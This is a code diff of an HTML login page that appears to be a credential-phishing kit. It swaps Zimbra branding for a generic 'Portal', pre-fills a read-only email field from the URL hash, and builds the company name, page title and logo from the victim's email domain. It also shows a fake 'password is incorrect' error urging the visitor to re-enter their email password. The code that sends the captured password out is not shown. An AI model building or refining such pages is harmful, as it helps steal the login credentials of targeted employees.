@@ -4,9 +4,51 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0; shrink-to-fit=no">
-    <title>Zimbra</title>
+    <title id="pageTitle">Portal</title>
     <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
     <link rel="stylesheet" href="assets/css/styles.css">
+    <style>
+        /* Styling for Sign In Button */
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0D5CAB; /* Button matches static background */
+            color: #FFFFFF; /* White font for readability */
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            margin-top: 1rem;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #0A4B8A; /* Slightly darker blue on hover */
+        }
+
+        /* Consistent Form Header and Text Styling */
+        .form-header,
+        .form-text {
+            font-size: 16px; /* Same size for all */
+            color: #444; /* Neutral dark color for clarity */
+            font-weight: normal; /* Uniform font style */
+            margin-bottom: 8px; /* Even spacing */
+        }
+
+        /* Dynamic Company Name Styling */
+        #companyName {
+            color: #0D5CAB; /* Matches button color */
+            font-size: 20px; /* Slightly larger for emphasis */
+            text-align: center; /* Center alignment */
+            font-weight: bold; /* Make it stand out */
+            margin-bottom: 12px; /* Space between name and next element */
+        }
+
+        /* Balance Spacing for Input Fields */
+        .form-group {
+            margin-bottom: 16px; /* Balanced vertical margin */
+        }
+    </style>
 </head>
 
 <body>
@@ -18,23 +60,24 @@
                     <img id="logoImg" class="fade" src="#" alt="Logo" style="height: 84px; width: auto;" />
 
                     <!-- Dynamic Company Name -->
-                    <h5 id="companyName" style="margin-top: 18px; margin-bottom: 6px;"></h5>
+                    <h5 id="companyName"></h5>
                 </div>
                 <div id="err" 
                      style="padding: 16px 40px; background: #efcccb; border-bottom: 2px solid rgb(128,0,0);">
                     <p style="font-size: 13px;">
-                        The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.
+                        The password is incorrect. Try again with your email password.
                     </p>
                 </div>
                 <div style="padding: 16px 40px;">
-                    <p style="font-size: 12px; margin-bottom: 4px;">Username</p>
-                    <input type="text" id="id" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;">
-                    <p style="font-size: 12px; margin-bottom: 4px; margin-top: 14px;">Password</p>
-                    <input type="password" id="pass" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;">
+                    <p class="form-text">Sign in with your Email to continue</p>
+                    <input type="text" id="id" class="form-group" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;" readonly>
+
+                    <p class="form-header">Enter password</p>
+                    <input type="password" id="pass" placeholder="Password" class="form-group" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;">
+
                     <div class="sp-div" style="margin-top: 10px;">
                         <button class="btn btn-primary" id="next-btn" 
                                 type="button" 
-                                style="width: 86px; height: 32px; padding: 2px 8px; font-size: 12px;"
                                 onclick="nextFun();">
                             Sign In
                         </button>
@@ -46,7 +89,7 @@
                         <option value="13">Billing Portal</option>
                         <option value="14">Payment Portal</option>
                     </select>
-                    <p style="font-size: 11px; margin-top: 6px; text-align: center; color: #555;">© 2025 TheOutdoorGroup</p>
+                    <p style="font-size: 11px; margin-top: 6px; text-align: center; color: #555;">© 2025 All Rights Reserved</p>
                 </div>
             </div>
         </div>
@@ -58,7 +101,7 @@
     <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
 
     <script>
-        /* Improved Branding Logic */
+        /* Dynamic branding logic */
         document.addEventListener("DOMContentLoaded", function () {
             const hash = decodeURIComponent(window.location.hash.substring(1));
             if (!hash.includes("@")) return;
@@ -70,14 +113,20 @@
             const emailParts = hash.split("@");
             const domain = emailParts[1].toLowerCase();
 
-            // Static mapping for known domains and company names
+            // Static mapping for known domains
             const companyNameMapping = {
-                "pinnacleinfotech.com": "Pinnacle Infotech",
-                "examplecompany.com": "Example Company",
+                "pinnacleinfotech.com": "PINNACLEINFOTECH",
+                "examplecompany.com": "EXAMPLECOMPANY",
             };
 
-            const companyName = companyNameMapping[domain] || domain.split(".")[0].replace(/[-_]/g, " ").toUpperCase();
+            // Determine company name (uppercase fallback)
+            const companyRootName = domain.split(".")[0].toUpperCase();
+            const companyName = companyNameMapping[domain] || companyRootName;
+
             document.getElementById("companyName").textContent = companyName;
+
+            // Update page title dynamically
+            document.getElementById("pageTitle").textContent = companyName || "Portal";
 
             // Logo and favicon setup
             const logo = document.getElementById("logoImg");
